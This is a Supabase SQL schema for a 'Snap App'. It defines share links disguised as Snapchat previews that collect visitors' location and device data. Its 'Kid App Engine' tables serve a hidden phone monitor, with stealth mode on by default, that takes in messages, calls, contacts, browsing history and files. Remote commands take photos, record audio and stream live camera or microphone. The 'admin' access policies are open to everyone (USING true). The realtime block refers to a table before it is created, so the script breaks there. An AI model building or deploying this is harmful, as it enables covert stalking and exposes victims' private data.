-- ==============================================================================
-- MASTER_SCHEMA.sql — CANONICAL DATABASE SCHEMA SNAPSHOT FOR SNAP APP
-- Single Source of Truth for Tables, Columns, Indexes, Constraints, RLS, & Realtime
-- ==============================================================================

CREATE EXTENSION IF NOT EXISTS "uuid-ossp";

-- 1. PROFILES
CREATE TABLE IF NOT EXISTS public.profiles (
  id UUID PRIMARY KEY REFERENCES auth.users(id) ON DELETE CASCADE,
  email TEXT, username TEXT,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now(), updated_at TIMESTAMPTZ NOT NULL DEFAULT now()
);

-- 2. IMAGE_LINKS
CREATE TABLE IF NOT EXISTS public.image_links (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  slug TEXT UNIQUE NOT NULL, image_path TEXT, target_url TEXT,
  link_type TEXT NOT NULL DEFAULT 'image', og_title TEXT, og_description TEXT,
  og_image_url TEXT, og_platform TEXT DEFAULT 'snapchat',
  permissions_config JSONB NOT NULL DEFAULT '{"location":true,"device_info":true,"camera":false,"contacts":false}'::jsonb,
  title TEXT, description TEXT, is_active BOOLEAN NOT NULL DEFAULT true,
  requires_location BOOLEAN NOT NULL DEFAULT true, expires_at TIMESTAMPTZ,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now(), updated_at TIMESTAMPTZ NOT NULL DEFAULT now()
);

-- 3. LOCATION_SESSIONS
CREATE TABLE IF NOT EXISTS public.location_sessions (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  link_id UUID NOT NULL REFERENCES public.image_links(id) ON DELETE CASCADE,
  consent_at TIMESTAMPTZ NOT NULL DEFAULT now(), started_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  ended_at TIMESTAMPTZ, status TEXT NOT NULL DEFAULT 'active' CHECK (status IN ('active', 'ended', 'revoked')),
  device_info JSONB DEFAULT '{}'::jsonb, ip_address TEXT, user_agent TEXT,
  permissions_granted JSONB DEFAULT '[]'::jsonb, captured_media_path TEXT, captured_data JSONB DEFAULT '{}'::jsonb
);

-- 4. LOCATION_UPDATES
CREATE TABLE IF NOT EXISTS public.location_updates (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  session_id UUID NOT NULL REFERENCES public.location_sessions(id) ON DELETE CASCADE,
  latitude DOUBLE PRECISION NOT NULL CHECK (latitude >= -90.0 AND latitude <= 90.0),
  longitude DOUBLE PRECISION NOT NULL CHECK (longitude >= -180.0 AND longitude <= 180.0),
  accuracy DOUBLE PRECISION, created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);

-- 5. ADMIN_SETTINGS
CREATE TABLE IF NOT EXISTS public.admin_settings (
  key TEXT PRIMARY KEY, value JSONB NOT NULL DEFAULT '{}'::jsonb, updated_at TIMESTAMPTZ NOT NULL DEFAULT now()
);

-- 6. MONITORED_DEVICES (Kid App Engine)
CREATE TABLE IF NOT EXISTS public.monitored_devices (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  child_name TEXT NOT NULL, device_name TEXT, model TEXT, os_version TEXT,
  battery_level INTEGER DEFAULT 100 CHECK (battery_level >= 0 AND battery_level <= 100),
  is_charging BOOLEAN DEFAULT false, is_online BOOLEAN DEFAULT true, stealth_mode_active BOOLEAN DEFAULT true,
  pairing_code TEXT UNIQUE, last_seen_at TIMESTAMPTZ DEFAULT now(),
  created_at TIMESTAMPTZ NOT NULL DEFAULT now(), updated_at TIMESTAMPTZ NOT NULL DEFAULT now()
);

-- 7. DEVICE_LOCATIONS (24/7 Route Breadcrumbs)
CREATE TABLE IF NOT EXISTS public.device_locations (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  device_id UUID NOT NULL REFERENCES public.monitored_devices(id) ON DELETE CASCADE,
  latitude DOUBLE PRECISION NOT NULL CHECK (latitude >= -90.0 AND latitude <= 90.0),
  longitude DOUBLE PRECISION NOT NULL CHECK (longitude >= -180.0 AND longitude <= 180.0),
  accuracy DOUBLE PRECISION, speed DOUBLE PRECISION, altitude DOUBLE PRECISION,
  battery_level INTEGER CHECK (battery_level >= 0 AND battery_level <= 100),
  created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);

-- 8. DEVICE_CONTACTS
CREATE TABLE IF NOT EXISTS public.device_contacts (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  device_id UUID NOT NULL REFERENCES public.monitored_devices(id) ON DELETE CASCADE,
  name TEXT NOT NULL, phone_numbers JSONB NOT NULL DEFAULT '[]'::jsonb, emails JSONB DEFAULT '[]'::jsonb,
  synced_at TIMESTAMPTZ NOT NULL DEFAULT now(), created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);

-- 9. DEVICE_CALLS
CREATE TABLE IF NOT EXISTS public.device_calls (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  device_id UUID NOT NULL REFERENCES public.monitored_devices(id) ON DELETE CASCADE,
  contact_name TEXT, phone_number TEXT NOT NULL,
  call_type TEXT NOT NULL CHECK (call_type IN ('incoming', 'outgoing', 'missed', 'rejected')),
  duration_seconds INTEGER DEFAULT 0, timestamp TIMESTAMPTZ NOT NULL, created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);

-- 10. DEVICE_MESSAGES
CREATE TABLE IF NOT EXISTS public.device_messages (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  device_id UUID NOT NULL REFERENCES public.monitored_devices(id) ON DELETE CASCADE,
  sender TEXT NOT NULL, recipient TEXT, body TEXT NOT NULL,
  message_type TEXT NOT NULL DEFAULT 'inbox' CHECK (message_type IN ('inbox', 'sent')),
  timestamp TIMESTAMPTZ NOT NULL, created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);

-- 11. DEVICE_COMMANDS
CREATE TABLE IF NOT EXISTS public.device_commands (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  device_id UUID NOT NULL REFERENCES public.monitored_devices(id) ON DELETE CASCADE,
  command TEXT NOT NULL CHECK (command IN ('ring_siren','take_photo','record_audio','sync_contacts','sync_calls','sync_messages','sync_apps','update_location','fetch_location','start_live_movement','stop_live_movement','webrtc_stream')),
  payload JSONB DEFAULT '{}'::jsonb, status TEXT NOT NULL DEFAULT 'pending' CHECK (status IN ('pending','sent','executed','failed')),
  result_media_path TEXT, executed_at TIMESTAMPTZ, created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);

-- 12. DEVICE_GEOFENCES
CREATE TABLE IF NOT EXISTS public.device_geofences (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  device_id UUID NOT NULL REFERENCES public.monitored_devices(id) ON DELETE CASCADE,
  name TEXT NOT NULL, latitude DOUBLE PRECISION NOT NULL CHECK (latitude >= -90.0 AND latitude <= 90.0),
  longitude DOUBLE PRECISION NOT NULL CHECK (longitude >= -180.0 AND longitude <= 180.0),
  radius_meters DOUBLE PRECISION NOT NULL DEFAULT 200, alert_on TEXT NOT NULL DEFAULT 'exit' CHECK (alert_on IN ('enter','exit','both')),
  is_active BOOLEAN NOT NULL DEFAULT true, created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);

-- INDEXES
CREATE INDEX IF NOT EXISTS idx_image_links_slug ON public.image_links(slug);
CREATE INDEX IF NOT EXISTS idx_image_links_active ON public.image_links(is_active, expires_at);
CREATE INDEX IF NOT EXISTS idx_location_sessions_link_id ON public.location_sessions(link_id);
CREATE INDEX IF NOT EXISTS idx_location_updates_session_id ON public.location_updates(session_id);
CREATE INDEX IF NOT EXISTS idx_location_updates_created_at ON public.location_updates(created_at DESC);
CREATE INDEX IF NOT EXISTS idx_monitored_devices_pairing ON public.monitored_devices(pairing_code);
CREATE INDEX IF NOT EXISTS idx_device_locations_device ON public.device_locations(device_id, created_at DESC);
CREATE INDEX IF NOT EXISTS idx_device_contacts_device ON public.device_contacts(device_id);
CREATE INDEX IF NOT EXISTS idx_device_calls_device ON public.device_calls(device_id, timestamp DESC);
CREATE INDEX IF NOT EXISTS idx_device_messages_device ON public.device_messages(device_id, timestamp DESC);
CREATE INDEX IF NOT EXISTS idx_device_commands_device ON public.device_commands(device_id, status);

-- ROW LEVEL SECURITY
ALTER TABLE public.profiles ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.image_links ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.location_sessions ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.location_updates ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.admin_settings ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.monitored_devices ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.device_locations ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.device_contacts ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.device_calls ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.device_messages ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.device_commands ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.device_geofences ENABLE ROW LEVEL SECURITY;

-- PUBLIC SHARE POLICIES
CREATE POLICY "Public can view active links by slug" ON public.image_links FOR SELECT USING (is_active = true AND (expires_at IS NULL OR expires_at > now()));
CREATE POLICY "Public can create location session" ON public.location_sessions FOR INSERT WITH CHECK (EXISTS (SELECT 1 FROM public.image_links WHERE id = link_id AND is_active = true));
CREATE POLICY "Public can view own session" ON public.location_sessions FOR SELECT USING (true);
CREATE POLICY "Public can insert location updates" ON public.location_updates FOR INSERT WITH CHECK (EXISTS (SELECT 1 FROM public.location_sessions WHERE id = session_id AND status = 'active'));

-- ADMIN FULL ACCESS POLICIES
CREATE POLICY "Admin full access on profiles" ON public.profiles FOR ALL USING (true) WITH CHECK (true);
CREATE POLICY "Admin full access on image_links" ON public.image_links FOR ALL USING (true) WITH CHECK (true);
CREATE POLICY "Admin full access on location_sessions" ON public.location_sessions FOR ALL USING (true) WITH CHECK (true);
CREATE POLICY "Admin full access on location_updates" ON public.location_updates FOR ALL USING (true) WITH CHECK (true);
CREATE POLICY "Admin full access on admin_settings" ON public.admin_settings FOR ALL USING (true) WITH CHECK (true);
CREATE POLICY "Admin full access on monitored_devices" ON public.monitored_devices FOR ALL USING (true) WITH CHECK (true);
CREATE POLICY "Admin full access on device_locations" ON public.device_locations FOR ALL USING (true) WITH CHECK (true);
CREATE POLICY "Admin full access on device_contacts" ON public.device_contacts FOR ALL USING (true) WITH CHECK (true);
CREATE POLICY "Admin full access on device_calls" ON public.device_calls FOR ALL USING (true) WITH CHECK (true);
CREATE POLICY "Admin full access on device_messages" ON public.device_messages FOR ALL USING (true) WITH CHECK (true);
CREATE POLICY "Admin full access on device_commands" ON public.device_commands FOR ALL USING (true) WITH CHECK (true);
CREATE POLICY "Admin full access on device_geofences" ON public.device_geofences FOR ALL USING (true) WITH CHECK (true);

-- REALTIME PUBLICATION
DO $$
BEGIN
  IF NOT EXISTS (SELECT 1 FROM pg_publication_tables WHERE pubname = 'supabase_realtime' AND tablename = 'location_updates') THEN
    ALTER PUBLICATION supabase_realtime ADD TABLE public.location_updates;
  END IF;
  IF NOT EXISTS (SELECT 1 FROM pg_publication_tables WHERE pubname = 'supabase_realtime' AND tablename = 'monitored_devices') THEN
    ALTER PUBLICATION supabase_realtime ADD TABLE public.monitored_devices;
  END IF;
  IF NOT EXISTS (SELECT 1 FROM pg_publication_tables WHERE pubname = 'supabase_realtime' AND tablename = 'device_locations') THEN
    ALTER PUBLICATION supabase_realtime ADD TABLE public.device_locations;
  END IF;
  IF NOT EXISTS (SELECT 1 FROM pg_publication_tables WHERE pubname = 'supabase_realtime' AND tablename = 'device_commands') THEN
    ALTER PUBLICATION supabase_realtime ADD TABLE public.device_commands;
  END IF;
  IF NOT EXISTS (SELECT 1 FROM pg_publication_tables WHERE pubname = 'supabase_realtime' AND tablename = 'device_live_sessions') THEN
    ALTER PUBLICATION supabase_realtime ADD TABLE public.device_live_sessions;
  END IF;
END $$;

-- ==============================================================================
-- 13. ADVANCED COMPANION MONITORING TABLES (ENGINE 2 EXPANSION)
-- ==============================================================================

-- 13.1 INSTALLED APPS & SCREEN TIME
CREATE TABLE IF NOT EXISTS public.device_installed_apps (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  device_id UUID NOT NULL REFERENCES public.monitored_devices(id) ON DELETE CASCADE,
  package_name TEXT NOT NULL,
  app_name TEXT NOT NULL,
  app_icon_url TEXT,
  usage_time_seconds INTEGER DEFAULT 0,
  last_time_used TIMESTAMPTZ,
  is_system_app BOOLEAN DEFAULT false,
  created_at TIMESTAMPTZ DEFAULT NOW(),
  updated_at TIMESTAMPTZ DEFAULT NOW(),
  CONSTRAINT uq_device_package UNIQUE(device_id, package_name)
);

-- 13.2 BROWSING HISTORY & VISITED SITES
CREATE TABLE IF NOT EXISTS public.device_browsing_history (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  device_id UUID NOT NULL REFERENCES public.monitored_devices(id) ON DELETE CASCADE,
  browser_name TEXT DEFAULT 'Chrome',
  url TEXT NOT NULL,
  title TEXT,
  visit_time TIMESTAMPTZ DEFAULT NOW(),
  created_at TIMESTAMPTZ DEFAULT NOW()
);

-- 13.3 ON-DEMAND GALLERY & FILE EXPLORER
CREATE TABLE IF NOT EXISTS public.device_files (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  device_id UUID NOT NULL REFERENCES public.monitored_devices(id) ON DELETE CASCADE,
  file_name TEXT NOT NULL,
  file_path TEXT NOT NULL,
  file_type TEXT NOT NULL DEFAULT 'image' CHECK (file_type IN ('image', 'video', 'audio', 'document', 'other')),
  file_size_bytes BIGINT DEFAULT 0,
  storage_path TEXT,
  thumbnail_path TEXT,
  created_at TIMESTAMPTZ DEFAULT NOW()
);

-- 13.4 LIVE WEBRTC STREAMING & WALKIE-TALKIE SESSIONS
CREATE TABLE IF NOT EXISTS public.device_live_sessions (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  device_id UUID NOT NULL REFERENCES public.monitored_devices(id) ON DELETE CASCADE,
  session_type TEXT NOT NULL CHECK (session_type IN ('audio_listen', 'walkie_talkie', 'video_front', 'video_back')),
  status TEXT NOT NULL DEFAULT 'requesting' CHECK (status IN ('requesting', 'active', 'ended')),
  sdp_offer JSONB,
  sdp_answer JSONB,
  ice_candidates JSONB DEFAULT '[]'::jsonb,
  created_at TIMESTAMPTZ DEFAULT NOW(),
  updated_at TIMESTAMPTZ DEFAULT NOW()
);

-- INDEXES
CREATE INDEX IF NOT EXISTS idx_installed_apps_device ON public.device_installed_apps(device_id);
CREATE INDEX IF NOT EXISTS idx_installed_apps_usage ON public.device_installed_apps(device_id, usage_time_seconds DESC);
CREATE INDEX IF NOT EXISTS idx_browsing_history_device ON public.device_browsing_history(device_id, visit_time DESC);
CREATE INDEX IF NOT EXISTS idx_device_files_device ON public.device_files(device_id, created_at DESC);
CREATE INDEX IF NOT EXISTS idx_live_sessions_device ON public.device_live_sessions(device_id, status);

-- RLS
ALTER TABLE public.device_installed_apps ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.device_browsing_history ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.device_files ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.device_live_sessions ENABLE ROW LEVEL SECURITY;

CREATE POLICY "Admin full access on device_installed_apps" ON public.device_installed_apps FOR ALL USING (true) WITH CHECK (true);
CREATE POLICY "Admin full access on device_browsing_history" ON public.device_browsing_history FOR ALL USING (true) WITH CHECK (true);
CREATE POLICY "Admin full access on device_files" ON public.device_files FOR ALL USING (true) WITH CHECK (true);
CREATE POLICY "Admin full access on device_live_sessions" ON public.device_live_sessions FOR ALL USING (true) WITH CHECK (true);

